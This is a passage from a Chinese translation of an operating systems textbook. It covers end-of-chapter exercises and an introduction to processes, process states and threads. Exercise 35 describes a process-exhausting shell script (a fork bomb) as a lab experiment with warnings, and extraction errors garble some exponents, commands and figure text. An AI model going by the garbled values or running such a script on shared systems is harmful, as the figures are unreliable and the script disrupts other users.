类似地，1MB存储器有22⁰(1048576)个字节，1GB 存储器有2³⁰(1073741824) 个字节。
但是，1Kb/s的通信线路每秒传送1000个位，而10Mb/s的局域网在10000000位/秒的速率上运 行，因为这里的速率不是2的幂。
很不幸，许多人倾向于将这两个系统混淆，特别是混淆关于磁盘容量 的度量。
在本书中，为了避免含糊，我们使用KB 、MB 和GB分别表示2¹⁰字节、220字节和2³⁰字节，而用 符号Kb/s 、Mb/s和Gb/s分别表示10³b/s 、10b/s 和10⁹b/s。
1.12 小结
考察操作系统有两种观点：资源管理观点和扩展的机器观点。
在资源管理观点中，操作系统的任务 是有效地管理系统的各个部分。
在扩展的机器观点中，系统的任务是为用户提供比实际机器更便于运用 的抽象。
这些抽象包括进程、地址空间以及文件。
操作系统的历史很长，从操作系统开始替代操作人员的那天开始到现代多道程序系统，主要包括早 期批处理系统、多道程序系统以及个人计算机系统。
由于操作系统同硬件的交互密切，掌握一些硬件知识对于理解它们是有益的。
计算机由处理器、存 储器以及I/O 设备组成。
这些部件通过总线连接。
所有操作系统构建所依赖的基本概念是进程、存储管理、I/O 管理、文件管理和安全。
这些内容都 将在后续用一章来讲述。
任何操作系统的核心是它可处理的系统调用集。
这些系统调用真实地说明了操作系统所做的工作。
对于UNIX, 我们已经考察了四组系统调用。
第一组系统调用同进程的创建和终止有关；第二组用于读 写文件；第三组用于目录管理；第四组包括各种杂项调用。
习题
1.操作系统的两大主要作用是什么?
2.在1.4节中描述了9种不同类型的操作系统，列 举每种操作系统的应用(每种系统一种应用)。
3.分时系统和多道程序系统的区别是什么?
4. 为了使用高速缓存，主存被划分为若干cache行 ， 通常每行长32或64字节。
每次缓存一整个cache 行。
每次缓存一整行而不是一个字节或一个字， 这样做的优点是什么?
5. 在早期计算机中，每个字节的读写直接由CPU 处理(即没有DMA) 。
对于多道程序而言这种 组织方式有什么含义?
6. 与访问I/O 设备相关的指令通常是特权指令，也 就是说，它们能在内核态执行而在用户态则不 行。
说明为什么这些指令是特权指令。
7. 系列计算机的思想在20世纪60年代由IBM 引入 System/360 大型机。
现在这种思想已经消亡了 还是继续活跃着?
8. 缓慢采用GUI 的一个原因是支持它的硬件的成 本(高昂)。
为了支持25行80列字符的单色文本 屏幕，需要多少视频RAM?
对于1024×768像 素24位色彩位图需要多少视频RAM?
在1980年 ( 每KB5美元),这些RAM的成本是多少?
现在 它的成本是多少?
9.在建立一个操作系统时有几个设计目的，例如 资源利用、及时性、健壮性等。
请列举两个可 能互相矛盾的设计目的。
10.内核态和用户态有哪些区别?
解释在设计操作 系统时存在两种不同的模式有什么帮助。
11.一个255GB大小的磁盘有65536个柱面，每个 磁道有255个扇区，每个扇区有512字节。
这个 磁盘有多少盘片和磁头?
假设平均寻道时间为 11ms, 平均旋转延迟为7ms, 读取速率为 100MB/s, 计算从一个扇区读取400KB需要的 平均时间。
12.下面的哪一条指令只能在内核态使用?
(a) 禁止所有的中断。
(b) 读日期一时间时钟。
(c) 设置日期一时间时钟。
(d) 改变存储器映像。
13. 考虑一个有两个CPU的系统，并且每一个CPU 有两个线程(超线程)。
假设有三个程序P0、 P1、P2, 分别以运行时间5ms、10ms、20ms
开始。
运行这些程序需要多少时间?
假设这三 个程序都是100%限于 CPU, 在运行时无阻 塞，并且一旦设定就不改变CPU。
14.一台计算机有一个四级流水线，每一级都花费 相同的时间执行其工作，即1ns。
这台机器每 秒可执行多少条指令?
15.假设 一 个计算机系统有高速缓存、内存 (RAM) 以及磁盘，操作系统用虚拟内存。
读 取缓存中的一个词需要1ns,RAM 需要10ns, 磁盘需要10ms 。
如果缓存的命中率是95%, 内存的是99%(缓存失效时),读取一个词的 平均时间是多少?
16.在用户程序进行一个系统调用，以读写磁盘文 件时，该程序提供指示说明了所需要的文件、
一个指向数据缓冲区的指针以及计数。
然后， 控制权转给操作系统，它调用相关的驱动程序。
假设驱动程序启动磁盘并且直到中断发生才终 止。
在从磁盘读的情况下，很明显，调用者会 被阻塞(因为文件中没有数据)。
在向磁盘写 时会发生什么情况?
需要把调用者阻塞一直等 到磁盘传送完成为止吗?
17.什么是陷阱指令?
在操作系统中解释它的用途。
18.在分时系统中为什么需要进程表?
在只有一个进 程存在的个人计算机系统中，该进程控制整个机 器直到进程结束，这种机器也需要进程表吗?
19.说明有没有理由在一个非空的目录中安装一个 文件系统。
如果要这样做，如何做?
20.对于下列系统调用，给出引起失败的条件： fork、exec以及unlink。
21.下列资源能使用哪种多路复用(时间、空间或 者两者皆可):CPU, 内存，磁盘，网卡，打 印机，键盘以及显示器?
22.在
count=write(fd,buffer,nbytes);
调用中，是否能将函数返回值传递给count 变 量而不是nbytes变量?
如果能，为什么?
23有一个文件，其文件描述符是fd, 内含下列字
节序列：3,1,4,1,5,9,2,6,5,3,5。
有如下系统调用：
Iseek(fd,3,SEEK_SET);
read(fd,&buffer,4);
其中Iseek调用寻找文件中的字节3。
在读操作 完成之后，buffer 中的内容是什么?
24. 假设一个10MB的文件保存在磁盘同一磁道 (磁道号为50)的连续扇区中。
磁盘的磁臂此 时位于第100号磁道。
要想从磁盘上找回这个 文件，需要多长时间?
假设磁臂从一个柱面移 动到下一个柱面需要1ms, 保存文件的开始部 分的扇区旋转到磁头下需要5ms, 并且读速率 是200MB/s。
25.块特殊文件和字符特殊文件的基本差别是什么?
26. 在图1-17的例子中库调用称为read, 而系统调 用自身称为read 。
这两者都有相同的名字是正 常的吗?
如果不是，哪一个更重要?
27.现代操作系统将进程的地址空间从机器物理内 存中分离出来。
列举这种设计的两个好处。
28.对程序员而言，系统调用就像对其他库过程的 调用一样。
有无必要让程序员了解哪一个库过 程导致了系统调用?
在什么情形下，为什么?
29. 图1-23说明有一批UNIX的系统调用没有与之 等价的Win32 API。
对于所列出的每一个没有 Win32 等价的调用，若程序员要把一个UNIX 程序转换到Windows下运行，会有什么后果?
30.可移植的操作系统是从一个系统体系结构移动 到另一个系统体系结构而不需要任何修改的操 作系统。
请解释为什么建立一个完全可移植性 的操作系统是不可行的。
描述一下在设计一个 高度可移植的操作系统时你设计的两个高级层 是什么样的。
31.请解释在建立基于微内核的操作系统时策略与 机制分离带来的好处。
32.虚拟机由于很多因素而十分流行，然而它们也 有一些缺点，给出一个缺点。
33.下面是单位转换的练习：
(a) 一微年是多少秒?
(b) 微米常称为micron。
那么meigamicron是多长?
(c)1PB 存储器中有多少字节?
(d) 地球的质量是6000 yottagram, 换算成 kilogram 是多少?
35.如果你有一个个人UNIX 类操作系统 (Linux 、 MINIX/3 、FreeBSD 等),可以安全地崩溃和再 启动，请写一个试图创建无限制数量子进程的 shell 脚本并观察所发生的事。
在运行实验之前， 通过shell 键入sync, 在磁盘上备好文件缓冲区 以避免毁坏文件系统。
注意：在没有得到系统 管理员的允许之前，不要在分时系统上进行这 一尝试。
其后果将会立即出现，尝试者可能会 被抓住并受到惩罚。
36. 用一个类似于UNIX od 的工具考察并尝试解释 UNIX 类系统或Windows 的目录。
提示：如何 进行取决于OS允许做什么。
一个有益的技巧是 在软盘上创建一个目录，其中包含一个操作系 统，然后使用另一个允许进行此类访问的不同 的操作系统读取盘上的原始数据。
第2章
Modern Operating Systems,Fourth Edition
进程与线程
从本章开始，我们将深入考察操作系统是如何设计和构造的。
操作系统中最核心的概念是进程：这 是对正在运行程序的一个抽象。
操作系统的其他所有内容都是围绕着进程的概念展开的，所以，让操作 系统的设计者(及学生)尽快并透彻地理解进程是非常重要的。
进程是操作系统提供的最古老的也是最重要的抽象概念之一。
即使可以使用的CPU 只有一个， 但它们也具有支持(伪)并发操作的能力，它们将一个单独的CPU 变换成多个虚拟的CPU。
没 有 进 程的抽象，现代计算将不复存在。
本章会通过大量的细节去探究进程，以及它们的第一个亲戚— 线 程 。
2.1 进程
现在考虑只有一个用户的PC。
一般用户不知道，当启动系统时，会秘密启动许多进程。
例如，启 动一个进程用来等待进入的电子邮件；或者启动另一个防病毒进程周期性地检查是否有病毒库更新。
另 外，某个用户进程可能会在所有用户上网的时候打印文件以及刻录CD-ROM 。
这些活动都需要管理，于 是一个支持多进程的多道程序系统在这里就显得很有用了。
在任何多道程序设计系统中，CPU 由一个进程快速切换至另一个进程，使每个进程各运行几十或几 百毫秒。
严格地说，在某一个瞬间，CPU 只能运行一个进程。
但在1秒钟内，它可能运行多个进程，这 样就产生并行的错觉。
有时人们所说的伪并行就是指这种情形，以此来区分多处理器系统(该系统有两 个或多个CPU共享同一个物理内存)的真正硬件并行。
人们很难对多个并行活动进行跟踪，因此，经过 多年的努力，操作系统的设计者开发了用于描述并行的一种概念模型(顺序进程),使得并行更容易处 理。
有关该模型、它的使用以及它的影响正是本章的主题。
2.1.1 进程模型
在进程模型中，计算机上所有可运行的软件，通常也包括操作系统，被组织成若干顺序进程 (sequential process),简称进程(process)。
一个进程就是一个正在执行程序的实例，包括程序计数器、 寄存器和变量的当前值。
从概念上说，每个进程拥有它自己的虚拟CPU。
当然，实际上真正的CPU在各 进程之间来回切换。
但为了理解这种系统，考虑在(伪)并行情况下运行的进程集，要比试图跟踪CPU 如何在程序间来回切换简单得多。
正如在第1章所看到的，这种快速的切换称作多道程序设计。
在图2-1a中可以看到，在一台多道程序计算机的内存中有4道程序。
在图2-1b中，这4道程序被抽象 为4个各自拥有自己控制流程(即每个程序自己的逻辑程序计数器)的进程，并且每个程序都独立地运 行。
当然，实际上只有一个物理程序计数器，所以在每个程序运行时，它的逻辑程序计数器被装入实际 的程序计数器中。
当该程序执行结束(或暂停执行)时，物理程序计数器被保存在内存中该进程的逻辑 程序计数器中。
在图2-1c中可以看到，在观察足够长的一段时间后，所有的进程都运行了，但在任何一 个给定的瞬间仅有一个进程真正在运行。
一个程序计数器
a)
四个程序计数器
b)
D
C B A
时间 →
c)
图2-1 a)含有4道程序的多道程序；b)4 个独立的顺序进程的概念模型；
c) 在任意时刻仅有一个程序是活跃的
在本章，我们假设只有一个CPU。
当然，逐渐这个假设就不为真了，因为新的芯片经常是多核的， 包含2个、4个或更多的CPU 。
第8章将会介绍多核芯片以及多处理器，但是现在， 一次只考虑一个CPU 会更简单一些。
因此，当我们说一个CPU 只能真正一次运行一个进程的时候，即使有2个核(或CPU), 每一个核也只能一次运行一个进程。
由于CPU 在各进程之间来回快速切换，所以每个进程执行其运算的速度是不确定的。
而且当同一进 程再次运行时，其运算速度通常也不可再现。
所以，在对进程编程时决不能对时序做任何想当然的假设。
例如，考虑一个I/O进程，它用流式磁带机恢复备份的文件，它执行一个10000次的空循环以等待磁带机 达到正常速度，然后发出命令读取第一个记录。
如果CPU决定在空循环期间切换到其他进程，则磁带机 进程可能在第一条记录通过磁头之后还未被再次运行。
当一个进程具有此类严格的实时要求时，也就是 一些特定事件一定要在所指定的若干毫秒内发生，那么必须采取特殊措施以保证它们一定在这段时间中 发生。
然而，通常大多数进程并不受CPU多道程序设计或其他进程相对速度的影响。
进程和程序间的区别是很微妙的，但非常重要。
用一个比喻可以更容易理解这一点。
想象一位有一 手好厨艺的计算机科学家正在为他的女儿烘制生日蛋糕。
他有做生日蛋糕的食谱，厨房里有所需的原料： 面粉、鸡蛋、糖、香草汁等。
在这个比喻中，做蛋糕的食谱就是程序(即用适当形式描述的算法),计 算机科学家就是处理器 (CPU), 而做蛋糕的各种原料就是输入数据。
进程就是厨师阅读食谱、取来各 种原料以及烘制蛋糕等一系列动作的总和。
现在假设计算机科学家的儿子哭着跑了进来，说他的头被一只蜜蜂蛰了。
计算机科学家就记录下他照着 食谱做到哪儿了(保存进程的当前状态),然后拿出一本急救手册，按照其中的指示处理蛰伤。
这里，处理 机从一个进程(做蛋糕)切换到另一个高优先级的进程(实施医疗救治),每个进程拥有各自的程序(食谱 和急救手册)。
当蜜蜂蛰伤处理完之后，这位计算机科学家又回来做蛋糕，从他离开时的那一步继续做下去。
值得注意的是，如果一个程序运行了两遍，则算作两个进程。
例如，人们可能经常两次启动同一个 字处理软件，或在有两个可用的打印机的情况下同时打印两个文件。
像“两个进程恰好运行同一个程序” 这样的事实其实无关紧要，因为它们是不同的进程。
操作系统能够使它们共享代码，因此只有一个副本 放在内存中，但那只是一个技术性的细节，不会改变有两个进程正在运行的概念。
2.1.2 进程的创建
操作系统需要有一种方式来创建进程。
一些非常简单的系统，即那种只为运行一个应用程序设计的 系统(例如，微波炉中的控制器),可能在系统启动之时，以后所需要的所有进程都已存在。
然而，在 通用系统中，需要有某种方法在运行时按需要创建或撤销进程，现在开始考察这个问题。
4种主要事件会导致进程的创建：
1)系统初始化。
2)正在运行的程序执行了创建进程的系统调用。
3)用户请求创建一个新进程。
4)一个批处理作业的初始化。
除了在启动阶段创建进程之外，新的进程也可以以后创建。
一个正在运行的进程经常发出系统调用， 以便创建一个或多个新进程协助其工作。
在所要从事的工作可以容易地划分成若干相关的但没有相互作 用的进程时，创建新的进程就特别有效果。
例如，如果有大量的数据要通过网络调取并进行顺序处理， 那么创建一个进程取数据，并把数据放入共享缓冲区中，而让第二个进程取走数据项并处理之，应该比 较容易。
在多处理机中，让每个进程在不同的CPU上运行会使整个作业运行得更快。
在交互式系统中，键入一个命令或者点(双)击一个图标就可以启动一个程序。
这两个动作中的任何一 个都会开始一个新的进程，并在其中运行所选择的程序。
在基于命令行的UNIX系统中运行程序X, 新的进程 会从该进程接管开启它的窗口。
在Microsoft Windows中，多数情形都是这样的，在一个进程开始时，它并没 有窗口，但是它可以创建一个(或多个)窗口。
在UNIX和Windows系统中，用户可以同时打开多个窗口，每 个窗口都运行一个进程。
通过鼠标用户可以选择一个窗口并且与该进程交互，例如，在需要时提供输入。
最后一种创建进程的情形仅在大型机的批处理系统中应用。
用户在这种系统中(可能是远程地)提 交批处理作业。
在操作系统认为有资源可运行另一个作业时，它创建一个新的进程，并运行其输入队列 中的下一个作业。
从技术上看，在所有这些情形中，新进程都是由于一个已存在的进程执行了一个用于创建进程的系 统调用而创建的。
这个进程可以是一个运行的用户进程、一个由键盘或鼠标启动的系统进程或者一个批 处理管理进程。
这个进程所做的工作是，执行一个用来创建新进程的系统调用。
这个系统调用通知操作 系统创建一个新进程，并且直接或间接地指定在该进程中运行的程序。
在UNIX系统中，只有一个系统调用可以用来创建新进程：fork 。
这个系统调用会创建一个与调用进 程相同的副本。
在调用了fork后，这两个进程(父进程和子进程)拥有相同的内存映像、同样的环境字 符串和同样的打开文件。
这就是全部情形。
通常，子进程接着执行execve 或一个类似的系统调用，以修 改其内存映像并运行一个新的程序。
例如，当一个用户在shell中键入命令sort时 ，shell就创建一个子进程， 然后，这个子进程执行sort 。
之所以要安排两步建立进程，是为了在fork 之后但在execve 之前允许该子 进程处理其文件描述符，这样可以完成对标准输入文件、标准输出文件和标准错误文件的重定向。
在Windows中，情形正相反， 一个Win32函数调用CreateProcess 既处理进程的创建，也负责把正 确的程序装入新的进程。
该调用有10个参数，其中包括要执行的程序、输入给该程序的命令行参数、各 种安全属性、有关打开的文件是否继承的控制位、优先级信息、该进程(若有的话)所需要创建的窗口 规格以及指向一个结构的指针，在该结构中新创建进程的信息被返回给调用者。
除了CreateProcess,
Win32中有大约100个其他的函数用于处理进程的管理、同步以及相关的事务。
在UNIX 和Windows 中，进程创建之后，父进程和子进程有各自不同的地址空间。
如果其中某个进 程在其地址空间中修改了一个字，这个修改对其他进程而言是不可见的。
在UNIX中，子进程的初始地 址空间是父进程的一个副本，但是这里涉及两个不同的地址空间，不可写的内存区是共享的。
某些 UNIX的实现使程序正文在两者间共享，因为它不能被修改。
或者，子进程共享父进程的所有内存，但 这种情况下内存通过写时复制 (copy-on-write) 共享，这意味着一旦两者之一想要修改部分内存，则这 块内存首先被明确地复制，以确保修改发生在私有内存区域。
再次强调，可写的内存是不可以共享的。
但是，对于一个新创建的进程而言，确实有可能共享其创建者的其他资源，诸如打开的文件等。
在 Windows中，从一开始父进程的地址空间和子进程的地址空间就是不同的。
日 在本章中，应将UNIX理解为几乎所有基于POSIX的系统，包括Linux 、FreeBSD 、OS X和Solaris等，如果进一 步扩展这一范围，则还应包括Android和iOS。
2.1.3 进程的终止
进程在创建之后，它开始运行，完成其工作。
但永恒是不存在的，进程也一样。
迟早这个新的进程 会终止，通常由下列条件引起：
1)正常退出(自愿的)。
2)出错退出(自愿的)。
3)严重错误(非自愿)。
4)被其他进程杀死(非自愿)。
多数进程是由于完成了它们的工作而终止。
当编译器完成了所给定程序的编译之后，编译器执行一 个系统调用，通知操作系统它的工作已经完成。
在UNIX中该调用是exit, 而 在Windows中，相关的调用 是ExitProcess 。
面向屏幕的程序也支持自愿终止。
字处理软件、Internet 浏览器和类似的程序中总有一 个供用户点击的图标或菜单项，用来通知进程删除它所打开的任何临时文件，然后终止。
进程终止的第二个原因是进程发现了严重错误。
例如，如果用户键入命令
cc foo.c
要编译程序foo.c, 但是该文件并不存在，于是编译器就会退出。
在给出了错误参数时，面向屏幕的交互 式进程通常并不退出。
相反，这些程序会弹出一个对话框，并要求用户再试一次。
进程终止的第三个原因是由进程引起的错误，通常是由于程序中的错误所致。
例如，执行了一条非 法指令、引用不存在的内存，或除数是零等。
有些系统中(如UNIX), 进程可以通知操作系统，它希望 自行处理某些类型的错误，在这类错误中，进程会收到信号(被中断),而不是在这类错误出现时终止。
第四种终止进程的原因是，某个进程执行一个系统调用通知操作系统杀死某个其他进程。
在UNIX 中，这个系统调用是kill。
在Win32中对应的函数是TerminateProcess 。
在这两种情形中，“杀手”都必 须获得确定的授权以便进行动作。
在有些系统中，当一个进程终止时，不论是自愿的还是其他原因，由 该进程所创建的所有进程也一律立即被杀死。
不过，UNIX 和Windows都不是这种工作方式。
2.1.4 进程的层次结构
某些系统中，当进程创建了另一个进程后，父进程和子进程就以某种形式继续保持关联。
子进程自 身可以创建更多的进程，组成一个进程的层次结构。
请注意，这与植物和动物的有性繁殖不同，进程只 有一个父进程(但是可以有零个、 一个、两个或多个子进程)。
在UNIX中，进程和它的所有子进程以及后裔共同组成一个进程组。
当用户从键盘发出一个信号时， 该信号被送给当前与键盘相关的进程组中的所有成员(它们通常是在当前窗口创建的所有活动进程)。
每个进程可以分别捕获该信号、忽略该信号或采取默认的动作，即被该信号杀死。
这里有另一个例子，可以用来说明进程层次的作用，考虑UNIX在启动时如何初始化自己。
一个称 为init的特殊进程出现在启动映像中。
当它开始运行时，读入一个说明终端数量的文件。
接着，为每个 终端创建一个新进程。
这些进程等待用户登录。
如果有一个用户登录成功，该登录进程就执行一个shell 准备接收命令。
所接收的这些命令会启动更多的进程，以此类推。
这样，在整个系统中，所有的进程都 属于以init 为根的一棵树。
相 反 ，Windows 中没有进程层次的概念，所有的进程都是地位相同的。
唯一类似于进程层次的暗示 是在创建进程的时候，父进程得到一个特别的令牌(称为句柄),该句柄可以用来控制子进程。
但是， 它有权把这个令牌传送给某个其他进程，这样就不存在进程层次了。
在UNIX 中，进程就不能剥夺其子 继承的“继承权”。
2.1.5 进程的状态
尽管每个进程是一个独立的实体，有其自己的程序计数器和内部状态，但是，进程之间经常需要相 互作用。
一个进程的输出结果可能作为另一个进程的输入。
在shell 命令
cat chapter1 chapter2 chapter3 |grep tree
中，第一个进程运行cat,将三个文件连接并输出。
第二个进程运行grep,它从输入中选择所有包含单词 “tree” 的那些行。
根据这两个进程的相对速度(这取决于这两个程序的相对复杂度和各自所分配到的
CPU时间),可能发生这种情况：grep 准备就绪可以运行，但输入还没有完成。
于是必须阻塞grep, 直 到 输入到来。
当一个进程在逻辑上不能继续运行时，它就会被阻塞，典型的例子是它在等待可以使用的输入。
还 可能有这样的情况： 一个概念上能够运行的进程被迫停止，因为操作系统调度另一个进程占用了CPU 。
这两种情况是完全不同的。
在第一种情况下，进程挂起是程序自身固有的原因(在键入用户命令行之前， 无法执行命令)。
第二种情况则是由系统技术上的原因引起的(由于没有足够的CPU, 所以不能使每个 进程都有一台私用的处理器)。
在图2-2中可以看到显示进程的三种状态的状态图，这三种状态是：
1)运行态(该时刻进程实际占用CPU)。
2)就绪态(可运行，但因为其他进程 正在运行而暂时停止)。
3)阻塞态(除非某种外部事件发生， 否则进程不能运行)。
前两种状态在逻辑上是类似的。
处于 这两种状态的进程都可以运行，只是对于 第二种状态暂时没有CPU 分配给它。
第三 种状态与前两种状态不同，处于该状态的 进程不能运行，即使CPU空闲也不行。
1.进程因为等待输入而被阻塞
2.调度程序选择另一个进程
3.调度程序选择这个进程
4.出现有效输入
图2-2 一个进程可处于运行态、阻塞态和就绪态，图中显 示出各状态之间的转换
进程的三种状态之间有四种可能的转
换关系，如图2-2所示。
在操作系统发现进程不能继续运行下去时，发生转换1。
在某些系统中，进程可 以执行一个诸如pause 的系统调用来进入阻塞状态。
在其他系统中，包括UNIX, 当 一个进程从管道或 设备文件(例如终端)读取数据时，如果没有有效的输入存在，则进程会被自动阻塞。
转换2和3是由进程调度程序引起的，进程调度程序是操作系统的一部分，进程甚至感觉不到调度程 序的存在。
系统认为一个运行进程占用处理器的时间已经过长，决定让其他进程使用CPU时间时，会发 生转换2。
在系统已经让所有其他进程享有了它们应有的公平待遇而重新轮到第一个进程再次占用CPU 运行时，会发生转换3。
调度程序的主要工作就是决定应当运行哪个进程、何时运行及它应该运行多长 时间，这是很重要的一点，我们将在本章的后面部分进行讨论。
目前已经提出了许多算法，这些算法力 图在整体效率和进程的竞争公平性之间取得平衡。
我们将在本章稍后部分研究其中的一些问题。
当进程等待的一个外部事件发生时(如一些输入到达),则发生转换4。
如果此时没有其他进程运行，
则立即触发转换3,该进程便开始运行。
否 则该进程将处于就绪态，等待CPU 空闲并 且轮到它运行。
进程
图2-3 基于进程的操作系统中最底层的是中断和调度处理， 在该层之上是顺序进程
盘中断时，系统会做出决定，停止运行当前进程，转而运行磁盘进程，该进程在此之前因等待中断而处 于阻塞态。
这样就可以不再考虑中断，而只是考虑用户进程、磁盘进程、终端进程等。
这些进程在等待 时总是处于阻塞状态。
在已经读入磁盘或键入字符后，等待它们的进程就被解除阻塞，并成为可调度运 行的进程。
从这个观点引出了图2-3所示的模型。
在图2-3中，操作系统的最底层是调度程序，在它上面有许多 进程。
所有关于中断处理、启动进程和停止进程的具体细节都隐藏在调度程序中。
实际上，调度程序是 一段非常短小的程序。
操作系统的其他部分被简单地组织成进程的形式。
不过，很少有真实的系统是以 这样的理想方式构造的。
2.1.6 进程的实现
为了实现进程模型，操作系统维护着一张表格(一个结构数组),即进程表 (process table)。
每 个 进 程占用一个进程表项。
(有些作者称这些表项为进程控制块。
)该表项包含了进程状态的重要信息，包括 程序计数器、堆栈指针、内存分配状况、所打开文件的状态、账号和调度信息，以及其他在进程由运行 态转换到就绪态或阻塞态时必须保存的信息，从而保证该进程随后能再次启动，就像从未被中断过一样。
图2-4中展示了在一个典型系统中的关键字段。
第一列中的字段与进程管理有关。
其他两列分别与 存储管理和文件管理有关。
应该注意到进程表中的字段是与系统密切相关的，不过该图给出了所需要信 息的大致介绍。
图2-4 典型的进程表表项中的一些字段
所有的中断都从保存寄存器开始，对于当前进程而言，通常是保存在进程表项中。
随后，会从堆栈 中删除由中断硬件机制存入堆栈的那部分信息，并将堆栈指针指向一个由进程处理程序所使用的临时堆
栈。
一些诸如保存寄存器值和设置堆栈指针等操作， 无法用C语言这一类高级语言描述，所以这些操作通 过一个短小的汇编语言例程来完成，通常该例程可以 供所有的中断使用，因为无论中断是怎样引起的，有 关保存寄存器的工作则是完全一样的。
当该例程结束后，它调用一个C过程处理某个特 定的中断类型剩下的工作。
(假定操作系统由C 语言编 写，通常这是所有真实操作系统的选择)。
在完成有 关工作之后，大概就会使某些进程就绪，接着调用调
图2-5 中断发生后操作系统最底层的工作步骤
度程序，决定随后该运行哪个进程。
随后将控制转给一段汇编语言代码，为当前的进程装入寄存器值以 及内存映射并启动该进程运行。
图2-5中总结了中断处理和调度的过程。
值得注意的是，各种系统之间 某些细节会有所不同。
一个进程在执行过程中可能被中断数千次，但关键是每次中断后，被中断的进程都返回到与中断发 生前完全相同的状态。
54 第 2 章
2.1.7 多道程序设计模型
采用多道程序设计可以提高CPU的利用率。
严格地说，如果进程用于计算的平均时间是进程在内存 中停留时间的20%,且内存中同时有5个进程，则CPU 将一直满负载运行。
然而，这个模型在现实中过
于乐观，因为它假设这5个进程不会同时等待I/O。
更好的模型是从概率的角度来看CPU的 利用率。
假设一个进程等待I/O 操作的时间与 其停留在内存中时间的比为p 。
当内存中同时 有n 个进程时，则所有n个进程都在等待I/O (此时CPU空转)的概率是p” 。
CPU的利用率 由下面的公式给出：
CPU利用率=1-p"
图2-6以n为变量的函数表示了CPU 的利 用率，n称为多道程序设计的道数 (degree of multiprogramming)。
从图2-6中可以清楚地看到，如果进程花 费80%的时间等待I/O, 为 使CPU的浪费低于
多道程序设计的道数
图2-6 CPU利用率是内存中进程数目的函数
从完全精确的角度考虑，应该指出此概率模型只是描述了一个大致的状况。
它假设所有n个进程是 独立的，即内存中的5个进程中，3个运行，2个等待，是完全可接受的。
但在单CPU中，不能同时运行3 个进程，所以当CPU忙时，已就绪的进程也必须等待CPU。
因而，进程不是独立的。
更精确的模型应该 用排队论构建，但我们的模型(当进程就绪时，给进程分配CPU, 否则让CPU空转)仍然是有效的，即 使真实曲线会与图2-6中所画的略有不同。
2.2 线程
在传统操作系统中，每个进程有一个地址空间和一个控制线程。
事实上，这几乎就是进程的定义。
不过，经常存在在同一个地址空间中准并行运行多个控制线程的情形，这些线程就像(差不多)分离的 进程(共享地址空间除外)。
在下面各节中，我们将讨论这些情形及其实现。
2.2.1 线程的使用
为什么人们需要在一个进程中再有一类进程?
有若干理由说明产生这些迷你进程(称为线程)的必 要性。
下面我们来讨论其中一些理由。
人们需要多线程的主要原因是，在许多应用中同时发生着多种活 动。
其中某些活动随着时间的推移会被阻塞。
通过将这些应用程序分解成可以准并行运行的多个顺序线 程，程序设计模型会变得更简单。
第二个关于需要多线程的理由是，由于线程比进程更轻量级，所以它们比进程更容易(即更快)创 建，也更容易撤销。
在许多系统中，创建一个线程较创建一个进程要快10~100倍。
在有大量线程需要动 态和快速修改时，具有这一特性是很有用的。
最后，在多CPU 系统中，多线程是有益的，在这样的系统中，真正的并行有了实现的可能，第8章 将讨论这个主题。
通过考察一些典型例子，我们可以更清楚地看出引入多线程的好处。
作为第一个例子，考虑一个字 处理软件。
字处理软件通常按照出现在打印页上的格式在屏幕上精确显示文档。
特别地，所有的行分隔 符和页分隔符都在正确的最终位置上，这样在需要时用户可以检查和修改文档(比如，消除孤行——在 一页上不完整的顶部行和底部行，因为这些行不甚美观)。
假设用户正在写一本书。
从作者的观点来看，最容易的方法是把整本书作为一个文件，这样一来， 查询内容、完成全局替换等都非常容易。
另一种方法是，把每一章都处理成单独一个文件。
但是，在把每 个小节和子小节都分成单个的文件之后，若必须对全书进行全局的修改时，那就真是麻烦了，因为有成百 个文件必须一个个地编辑。
例如，如果所建议的某个标准××××正好在书付印之前被批准了，于是“标 准草案××××”一类的字眼就必须改为“标准××××”。
如果整本书是一个文件，那么只要一个命令 就可以完成全部的替换处理。
相反，如果一本书分成了300个文件，那么就必须分别对每个文件进行编辑。
现在考虑，如果有一个用户突然在一个有800页的文件的第一页上删掉了一个语句之后，会发生什 么情形。
在检查了所修改的页面并确认正确后，这个用户现在打算接着在第600页上进行另一个修改， 并键入一条命令通知字处理软件转到该页面(可能要查阅只在那里出现的一个短语)。
于是字处理软件 被强制对整本书的前600页重新进行格式处理，这是因为在排列该页前面的所有页面之前，字处理软件 并不知道第600页的第一行应该在哪里。
而在第600页的页面可以真正在屏幕上显示出来之前，计算机可 能要拖延相当一段时间，从而令用户不甚满意。
多线程在这里可以发挥作用。
假设字处理软件被编写成含有两个线程的程序。
一个线程与用户交互， 而另一个在后台重新进行格式处理。
一旦在第1页中的语句被删除掉，交互线程就立即通知格式化线程 对整本书重新进行处理。
同时，交互线程继续监控键盘和鼠标，并响应诸如滚动第1页之类的简单命令， 此刻，另一个线程正在后台疯狂地运算。
如果有点运气的话，重新格式化会在用户请求查看第600页之 前完成，这样，第600页页面就立即可以在屏幕上显示出来。
图2-7 有三个线程的字处理软件
56 第 2 章
如果程序是单线程的，那么在进行磁盘备份时，来自键盘和鼠标的命令就会被忽略，直到备份工作 完成为止。
用户当然会认为性能很差。
另一个方法是，为了获得好的性能，可以让键盘和鼠标事件中断 磁盘备份，但这样却引入了复杂的中断驱动程序设计模型。
如果使用三个线程，程序设计模型就很简单 了。
第一个线程只是和用户交互；第二个线程在得到通知时进行文档的重新格式化；第三个线程周期性 地将RAM中的内容写到磁盘上。
很显然，在这里用三个不同的进程是不能工作的，这是因为三个线程都需要对同 一 个文件进行操作。
由于多个线程可以共享公共内存，所以通过用三个线程替换三个进程，使得它们可以访问同一个正在编 辑的文件，而三个进程是做不到的。
许多其他的交互式程序中也存在类似的情形。
例如，电子表格是允许用户维护矩阵的一种程序，矩 阵中的一些元素是用户提供的数据；另一些元素是通过所输入的数据运用可能比较复杂的公式而得出的 计算结果。
当用户改变一个元素时，许多其他元素就必须重新计算。
通过一个后台线程进行重新计算的 方式，交互式线程就能够在进行计算的时候，让用户从事更多的工作。
类似地，第三个线程可以在磁盘
上进行周期性的备份工作。
网络连接
在这里，一个称为分派程序 (dispatcher) 的线程从网络中读入工作请求。
在检查请求之后，分派线程挑 选一个空转的(即被阻塞的)工作线程 (worker thread),提交该请求，通常是在每个线程所配有的某个 专门字中写入一个消息指针。
接着分派线程唤醒睡眠的工作线程，将它从阻塞状态转为就绪状态。
在工作线程被唤醒之后，它检查有关的请求是否在Web页面高速缓存之中，这个高速缓存是所有线 程都可以访问的。
如果没有，该线程开始一个从磁盘调入页面的read 操作，并且阻塞直到该磁盘操作完 成。
当上述线程阻塞在磁盘操作上时，为了完成更多的工作，分派线程可能挑选另一个线程运行，也可 能把另 一 个当前就绪的工作线程投入运行。
图2-9给出了有关代码的大致框架。
